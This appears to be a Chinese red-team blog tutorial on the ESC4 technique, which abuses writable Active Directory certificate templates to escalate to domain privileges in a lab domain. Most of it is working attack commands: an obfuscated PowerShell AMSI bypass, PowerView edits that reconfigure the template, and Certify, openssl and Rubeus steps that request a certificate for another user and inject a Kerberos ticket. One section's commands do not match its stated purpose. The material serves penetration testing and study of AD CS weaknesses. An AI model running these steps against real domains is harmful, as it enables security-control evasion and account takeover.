### 针对域证书服务的攻击（4）- ESC4

#### 0x00 前言
ESC4，全称为“Vulnerable Certificate Template Access Control”，是一种利用弱访问控制列表（ACL）的证书模板进行域提权的技术。在完成ESC1至ESC3的研究后，由于白皮书中缺乏详细的步骤说明，并且我的本地域环境出现了一些问题，因此一直搁置至今。然而，在国庆期间，国外研究人员发布了一篇关于ESC4的文章（链接：[Abusing_Weak_ACL_on_Certificate_Templates](https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates)），这大大减少了我后续的工作量。

每个证书模板都有自己的权限控制策略。ESC4正是利用了这些权限控制不严格的漏洞，例如，如果“Domain Users”组的用户具有写入权限，那么他们就可以修改模板配置以满足提权需求，比如将模板配置成与ESC1类似的样式。接下来，我们将搭建测试环境以进一步探讨这一过程。

#### 0x01 危害环境搭建
我们基于“基本EFS”配置ESC4的危害模板，具体步骤如下：
1. 修改模板名称为“ESC4”。
2. 开启CA证书管理程序批准。
3. 开启授权签名。
4. 配置“Domain Users”组具有可写权限（这是关键点）。
5. 其他配置保持默认设置。
6. 发布证书模板。

需要注意的是，关键在于“Domain Users”组具有写入权限，其他配置只是为了模拟常见情况。

#### 0x02 利用
我们将使用Certify.exe来发现并利用这个漏洞：

```bash
Certify.exe find /vulnerable
```

主要利用的是“Domain Users”组具有WriteDacl权限，通过该权限可以修改模板配置，使其满足ESC1的要求。

**模板注册权限**
目前我们只有模板的写入权限，但没有注册权限。我们可以使用PowerView来添加注册权限。直接加载PowerView可能会被AMSI拦截，但我们可以通过以下方法绕过AMSI：

```powershell
$a="5492868772801748688168747280728187173688878280688776828"
$b="1173680867656877679866880867644817687416876797271"
$c=[string](0..37|%{[char][int](29+($a+$b).substring(($_*2),2))})-replace " "
$d=[Ref].Assembly.GetType($c)
$e=[string](38..51|%{[char][int](29+($a+$b).substring(($_*2),2))})-replace " "
$f=$d.GetField($e,'NonPublic,Static')
$f.SetValue($null,$true)
```

验证是否具有注册权限：

```bash
Certify.exe find /vulnerable
```

**禁用CA证书管理程序批准**
虽然我们之前手动开启了这项功能以模拟常见情况，但现在需要将其关闭。同样使用PowerView：

```powershell
Add-DomainObjectAcl -TargetIdentity ESC4 -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=redteamlab,DC=com" -Verbose
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=redteamlab,DC=com" -Identity ESC4 -XOR @{'mspki-enrollment-flag'=2} -Verbose
```

**禁用授权签名**
将授权签名数设置为0即可禁用授权签名：

```powershell
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=redteamlab,DC=com" -Identity ESC4 -Set @{'mspki-ra-signature'=0} -Verbose
```

**启用在请求中提供使用者名称**
配置此选项后，我们可以将任何用户名指定为SAN的值：

```powershell
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=redteamlab,DC=com" -Identity ESC4 -XOR @{'mspki-certificate-name-flag'=1} -Verbose
```

**更改应用策略扩展**
添加“客户端身份验证”以使用证书登录：

```powershell
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=redteamlab,DC=com" -Identity ESC4 -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```

通过上述操作，我们实际上将ESC4改成了ESC1，核心在于我们能够对模板进行写入操作。接下来的操作与ESC1相同，利用Certify.exe获取TGT。

#### 0x03 理解
在0x02节中，我们使用PowerView直接修改了模板的多个属性。可以使用PowerView查看这些属性的具体配置，对应于界面中的相关选项。这里借用[GitHub项目](https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates)中的图示。

```bash
Certify.exe request /ca:"win2019.redteamlab.com\redteamlab-WIN2019-CA-1" /template:ESC4 /altname:xiaoaiti
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Rubeus.exe asktgt /user:xiaoaiti /certificate:cert.pfx /ptt
Get-DomainObject -SearchBase "CN=Configuration,DC=redteamlab,DC=com" -LDAPFilter "(objectclass=pkicertificatetemplate)" -Identity ESC4
```

#### 0x04 总结
ESC4的核心在于权限控制问题，使得低权限用户可以修改证书模板，从而将模板配置成可以提权的形式。通过这种方式，攻击者可以利用修改后的模板进行域提权。

---

**Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-11**

**No. 1 / 9 - Welcome to www.red-team.cn**

**No. 2 / 9 - Welcome to www.red-team.cn**

**No. 3 / 9 - Welcome to www.red-team.cn**

**No. 4 / 9 - Welcome to www.red-team.cn**

**No. 5 / 9 - Welcome to www.red-team.cn**

**No. 6 / 9 - Welcome to www.red-team.cn**

**No. 7 / 9 - Welcome to www.red-team.cn**

**No. 8 / 9 - Welcome to www.red-team.cn**

**No. 9 / 9 - Welcome to www.red-team.cn**